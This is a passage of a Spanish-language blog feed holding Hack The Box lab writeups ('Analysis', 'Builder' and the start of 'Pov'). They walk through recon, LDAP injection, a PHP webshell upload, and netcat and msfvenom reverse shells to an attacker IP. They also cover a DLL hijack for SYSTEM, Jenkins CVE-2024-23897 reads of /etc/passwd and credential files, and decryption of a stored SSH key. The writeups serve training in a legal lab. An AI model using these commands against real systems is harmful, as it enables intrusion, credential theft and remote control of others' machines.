80/tcp    open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-05 23:55:03Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
3306/tcp  open   mysql         MySQL (unauthorized)
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6327/tcp  closed unknown
9389/tcp  open   mc-nmf        .NET Message Framing
33060/tcp open   mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, X11Probe: 
|     Invalid message&quot;
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message&quot;
|     HY000
|   oracle-tns: 
|     Invalid message-frame.&quot;
|_    HY000
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49671/tcp open   msrpc         Microsoft Windows RPC
49674/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open   msrpc         Microsoft Windows RPC
49676/tcp open   msrpc         Microsoft Windows RPC
49677/tcp open   msrpc         Microsoft Windows RPC
49682/tcp open   msrpc         Microsoft Windows RPC
49732/tcp open   msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=6/5%Time=6660F9B2%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GetRequest,9,&quot;\x05\0\
SF:0\0\x0b\x08\x05\x1a\0&quot;)%r(HTTPOptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)
SF:%r(RTSPRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(RPCCheck,9,&quot;\x05\0\0
SF:\0\x0b\x08\x05\x1a\0&quot;)%r(DNSVersionBindReqTCP,9,&quot;\x05\0\0\0\x0b\x08\x05
SF:\x1a\0&quot;)%r(DNSStatusRequestTCP,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0
SF:\0\x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(Help,9
SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x
SF:05HY000&quot;)%r(TerminalServerCookie,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(Ke
SF:rberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,9,&quot;\x05\0\0\0\x0b
SF:\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\
SF:x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(FourOhFou
SF:rRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LPDString,9,&quot;\x05\0\0\0\x0
SF:b\x08\x05\x1a\0&quot;)%r(LDAPSearchReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\
SF:0\0\0\x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(LDA
SF:PBindReq,46,&quot;\x05
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Enumeration&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;
intentamos ejecutar whatweb:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; whatweb http://analysis.htb/ 
http://analysis.htb/ [200 OK] Country[RESERVED][ZZ], Email[mail@demolink.org,privacy@demolink.org], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.250], JQuery, Microsoft-IIS[10.0], Script[text/javascript]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Tratamos de fuzz para encontrar subdirectorios:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gobuster dir -u http://analysis.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Pero no vemos nada interesante.&lt;/p&gt;
&lt;p&gt;Podemos intentar buscar subdominios:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ffuf -u http://10.10.11.250 -H &quot;Host: FUZZ.analysis.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;fuzzamos este nuevo subdominio:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb -t 55

/users                (Status: 301) [Size: 170] [--&amp;gt; http://internal.analysis.htb/users/]
/dashboard            (Status: 301) [Size: 174] [--&amp;gt; http://internal.analysis.htb/dashboard/]
/Users                (Status: 301) [Size: 170] [--&amp;gt; http://internal.analysis.htb/Users/]
/employees            (Status: 301) [Size: 174] [--&amp;gt; http://internal.analysis.htb/employees/]
/Dashboard            (Status: 301) [Size: 174] [--&amp;gt; http://internal.analysis.htb/Dashboard/]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;También podemos filtrar por extensiones php en estos subdirectorios:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;users&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/users/ -t 55 -x php

/list.php             (Status: 200) [Size: 17]
/List.php             (Status: 200) [Size: 17]
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dashboard&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/dashboard/ -t 55 -x php

/img                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/img/]
/index.php            (Status: 200) [Size: 38]
/uploads              (Status: 301) [Size: 182] [--&amp;gt; http://internal.analysis.htb/dashboard/uploads/]
/upload.php           (Status: 200) [Size: 0]
/details.php          (Status: 200) [Size: 35]
/css                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/css/]
/Index.php            (Status: 200) [Size: 38]
/lib                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/lib/]
/form.php             (Status: 200) [Size: 35]
/js                   (Status: 301) [Size: 177] [--&amp;gt; http://internal.analysis.htb/dashboard/js/]
/logout.php           (Status: 302) [Size: 3] [--&amp;gt; ../employees/login.php]
/tickets.php          (Status: 200) [Size: 35]
/emergency.php        (Status: 200) [Size: 35]
/IMG                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/IMG/]
/INDEX.php            (Status: 200) [Size: 38]
/Details.php          (Status: 200) [Size: 35]
/Form.php             (Status: 200) [Size: 35]
/CSS                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/CSS/]
/Img                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/Img/]
/JS                   (Status: 301) [Size: 177] [--&amp;gt; http://internal.analysis.htb/dashboard/JS/]
/Upload.php           (Status: 200) [Size: 0]
/Uploads              (Status: 301) [Size: 182] [--&amp;gt; http://internal.analysis.htb/dashboard/Uploads/]
/Logout.php           (Status: 302) [Size: 3] [--&amp;gt; ../employees/login.php]
/Lib                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/Lib/]
/Tickets.php          (Status: 200) [Size: 35]
/Emergency.php        (Status: 200) [Size: 35]
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;employes&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/employees/ -t 55 -x php


/login.php            (Status: 200) [Size: 1085]
/Login.php            (Status: 200) [Size: 1085]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;si hacemos un curl a &lt;code&gt;http://internal.analysis.htb/users/list.php&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -s http://internal.analysis.htb/users/list.php

missing parameter
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Fuzzing para encontrar el parámetro requerido en la URL&lt;/h3&gt;
&lt;p&gt;vemos que la URL necesita un parámetro, por lo que vamos a fuzz este parámetro:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &apos;http://internal.analysis.htb/users/list.php?FUZZ&apos; -fs 17


name                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9807ms]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;donde encontramos el parámetro llamado nombre. Así que tenemos el archivo con el parámetro &lt;code&gt;http://internal.analysis.htb/users/list.php?name&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;LDAP Injection&lt;/h3&gt;
&lt;p&gt;Recuerda que el servicio LDAP se estaba ejecutando en esta máquina. Buscando inyecciones LDAP en HackTricks, podríamos probar algo como name=* para ver si esto devuelve algo. Si visito http://internal.analysis.htb/users/list.php?name=* para intentar una inyección, puedo ver un usuario:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Script for LDAP Injection&lt;/h2&gt;
&lt;p&gt;Vamos a crear un script en C++ para automatizar la inyección LDAP&lt;/p&gt;
&lt;p&gt;Primero, instalamos lo que necesitamos:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install libcurl4-openssl-dev libargparse-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;aquí está nuestro script: https://github.com/mil4ne/auto-LDAP-Injection&lt;/p&gt;
&lt;p&gt;Compilamos:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;g++ ldap.c++ -o ejecutable -I. -lcurl
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A continuación, ejecutamos el script:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./ejecutable -u &quot;http://internal.analysis.htb/users/list.php?name&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nuestro resultado final es este &lt;code&gt;97NTtl*4QP96Bv&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;con las credenciales encontradas, vamos al panel que encontramos antes:
&lt;code&gt;http://internal.analysis.htb/employees/login.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;aquí hay una sección llamada &lt;code&gt;SOC Report&lt;/code&gt; donde podemos subir un archivo:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;WebShell upload&lt;/h3&gt;
&lt;p&gt;llevemos un webshell a nuestra máquina atacante, para subirlo a la web:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Después de subirlo, lo encontraremos en: &lt;code&gt;http://internal.analysis.htb/dashboard/uploads/webshell.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ahora subiremos netcat a la maquina victima para enviarnos un revshell:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python3 -m http.server
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/9.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;con certutil.exe descargamos el nc con la ayuda de nuestro webshell:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/10.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;nos ponemos en modo escucha:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; rlwrap -cAr nc -lvnp 4444
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Enviamos el revshell:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Users\Public\Downloads\nc.exe 10.10.14.166 4444 -e C:\Windows\System32\cmd.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora tenemos un shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/11.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;transferimos winpeas a nuestra máquina víctima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;certutil.exe -urlcache -split -f http://10.10.14.166:8000/winPEASx64.exe C:\Users\Public\Downloads\win.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lo ejecutamos:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Users\Public\Downloads\win.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Movimiento Lateral&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;En nuestro resultado encontramos credenciales:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  analysis.htb.
    DefaultUserName               :  jdoe
    DefaultPassword               :  7y4Z4^*y9Zzj
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;intentamos ver si este usuario es válido para conectarse a través de &lt;code&gt;evil-winrm&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec winrm 10.10.11.250 -u &apos;jdoe&apos; -p &apos;7y4Z4^*y9Zzj&apos; 
SMB         10.10.11.250    5985   DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb)
HTTP        10.10.11.250    5985   DC-ANALYSIS      [*] http://10.10.11.250:5985/wsman
WINRM       10.10.11.250    5985   DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^*y9Zzj (Pwn3d!)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;es válido.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;evil-winrm -i 10.10.11.250 -u &apos;jdoe&apos; -p &apos;7y4Z4^*y9Zzj&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;si volvemos a ejecutar winpeas podemos ver lo siguiente:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Evil-WinRM* PS C:\Users\jdoe\Documents&amp;gt; C:\Users\jdoe\Documents\winpeas.exe

&amp;lt;SNIP&amp;gt;
Snort(Snort)[C:\Snort\bin\snort.exe /SERVICE] - Autoload - No quotes and Space detected
    Possible DLL Hijacking in binary folder: C:\Snort\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])

&amp;lt;SNIP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Así que SNORT es una herramienta para la prevención de intrusiones y, asumo, que debe ejecutarse con algún tipo de privilegios para ello. Parece que atacar el servicio SNORT podría ser un camino potencial para la escalada de privilegios.&lt;/p&gt;
&lt;p&gt;La comprobación de permisos con icacls muestra que podemos escribir en estos archivos:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Evil-WinRM* PS C:\Users\jdoe\Documents&amp;gt; icacls C:\Snort\lib\snort_dynamicengine

C:\Snort\lib\snort_dynamicengine AUTORITE NT\SystŠme:(I)(OI)(CI)(F)
                                 BUILTIN\Administrateurs:(I)(OI)(CI)(F)
                                 BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)
                                 BUILTIN\Utilisateurs:(I)(CI)(AD)
                                 BUILTIN\Utilisateurs:(I)(CI)(WD)
                                 CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\jdoe\Documents&amp;gt; icacls C:\Snort\lib\snort_dynamicpreprocessor

C:\Snort\lib\snort_dynamicpreprocessor AUTORITE NT\SystŠme:(I)(OI)(CI)(F)
                                       BUILTIN\Administrateurs:(I)(OI)(CI)(F)
                                       BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)
                                       BUILTIN\Utilisateurs:(I)(CI)(AD)
                                       BUILTIN\Utilisateurs:(I)(CI)(WD)
                                       CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Observo que en este directorio tenemos archivos .dll, por lo que podemos intentar un secuestro de DLL:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\jdoe\Documents&amp;gt; cmd.exe /c dir C:\Snort\lib\snort_dynamicengine
 Volume in drive C has no label.
 Volume Serial Number is 0071-E237

 Directory of C:\Snort\lib\snort_dynamicengine

07/08/2023  03:31 PM    &amp;lt;DIR&amp;gt;          .
07/08/2023  03:31 PM    &amp;lt;DIR&amp;gt;          ..
05/24/2022  06:48 AM            78,336 sf_engine.dll
               1 File(s)         78,336 bytes
               2 Dir(s)   4,018,229,248 bytes free
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Para ello, creamos un archivo malicioso &lt;code&gt;.dll&lt;/code&gt; con &lt;code&gt;msfvenom&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9999 -f dll -a x64 -o nr.dll  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos ponemos en escucha:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rlwrap -cAr nc -lvnp 9999
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;luego vamos a la ruta &lt;code&gt;C:\Snort\lib\snort_dynamicpreprocessor&lt;/code&gt; y dentro de ese directorio subimos nuestra dll maliciosa&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;upload nr.dll
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;En 1 minuto tendremos un shell como administrador.&lt;/p&gt;
</content:encoded></item><item><title>Builder HTB Writeup</title><link>https://fuwari.vercel.app/posts/builder/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/builder/</guid><description>Medium Machine</description><pubDate>Thu, 20 Jun 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Comenzamos nuestros escaneos con nmap.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap 10.10.11.10 -sS -p- --open -n -Pn --min-rate 3000 -vvv -oG ports 

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 62
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p8080,22 10.10.11.10 -sVC

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:De:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(10.0.18)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Sólo tenemos 2 puertos, veamos el sitio web.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Miramos las versiones:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; whatweb http://10.10.11.10:8080/  
            
http://10.10.11.10:8080/ [200 OK] Cookies[JSESSIONID.678bd8a0], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.678bd8a0], IP[10.10.11.10], Jenkins[2.441], Jetty[10.0.18], OpenSearch[/opensearch.xml], Script[application/json,text/javascript], Title[Dashboard [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Buscar la versión de Jenkins que encontramos en la web. &lt;code&gt;Jenkins 4.441&lt;/code&gt; explotar&lt;/p&gt;
&lt;h3&gt;CVE-2024-23897 - Jenkins Arbitrary File Leak Vulnerability&lt;/h3&gt;
&lt;p&gt;Descargue el archivo &lt;code&gt;.jar&lt;/code&gt; del jenkins vulnerable&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Aquí tienes más información al respecto:&lt;/p&gt;
&lt;p&gt;https://www.zscaler.com/blogs/security-research/jenkins-arbitrary-file-leak-vulnerability-cve-2024-23897-can-lead-rce&lt;/p&gt;
&lt;p&gt;Lista el &lt;code&gt;/etc/passwd&lt;/code&gt; de la máquina víctima.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node &apos;@/etc/passwd&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Directory Structure for Jenkins&lt;/h3&gt;
&lt;p&gt;Aquí comparto información sobre el orden de los directorios Jenkins:&lt;/p&gt;
&lt;p&gt;https://medium.com/@knoldus/directory-structure-and-installing-plugins-in-jenkins-3dd62488631c&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Buscamos el nombre de usuario:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;java -jar jenkins-cli.jar -noCertificateCheck -s &apos;http://10.10.11.10:8080&apos; connect-node &quot;@/var/jenkins_home/users/users.xml&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Cada lugar tiene su &lt;code&gt;config.xml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Cada usuario tiene un archivo &lt;code&gt;config.xml&lt;/code&gt;, veámoslo:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;java -jar jenkins-cli.jar -noCertificateCheck -s &apos;http://10.10.11.10:8080&apos; connect-node &quot;@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Encontramos un hash en el archivo:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;La rompimos con &lt;code&gt;John&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Login in Jenkins&lt;/h3&gt;
&lt;p&gt;Iniciemos sesión con las credenciales encontradas.&lt;/p&gt;
&lt;p&gt;Jenkins credentials — &lt;code&gt;jennifer&lt;/code&gt; : &lt;code&gt;princess&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Si vamos a &amp;gt; Manage Jenkins &amp;gt; Credentials &amp;gt; System &amp;gt; Global Crendentials (UNrestricted)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/9.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Si inspeccionamos por encima de la clave, podemos ver que la clave ssh está encriptada.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/10.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;How to Print Password Encryption Jenkins&lt;/h3&gt;
&lt;p&gt;Imprimimos la clave en la consola de Jenkins con el siguiente comando que encontramos en esta web:&lt;/p&gt;
&lt;p&gt;https://stackoverflow.com/questions/25547381/what-password-encryption-jenkins-is-using&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;println(hudson.util.Secret.fromString(&quot;{encrypt hash}&quot;))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/11.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;y ahora como siempre, guardamos la clave y le damos permisos&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chmod 600 id_rsa
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;ssh -i id_rsa root@10.10.11.10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/12.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Pov HTB Writeup</title><link>https://fuwari.vercel.app/posts/pov/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/pov/</guid><description>Medium Machine</description><pubDate>Mon, 17 Jun 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Comenzamos nuestros escaneos con nmap.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS -p- --open --min-rate 3000 -Pn -n -vvv 10.10.11.251 -oG nmap 

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p80 -sVC 10.10.11.251 -oN Ports


PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;Service&lt;/th&gt;
&lt;th&gt;Product&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
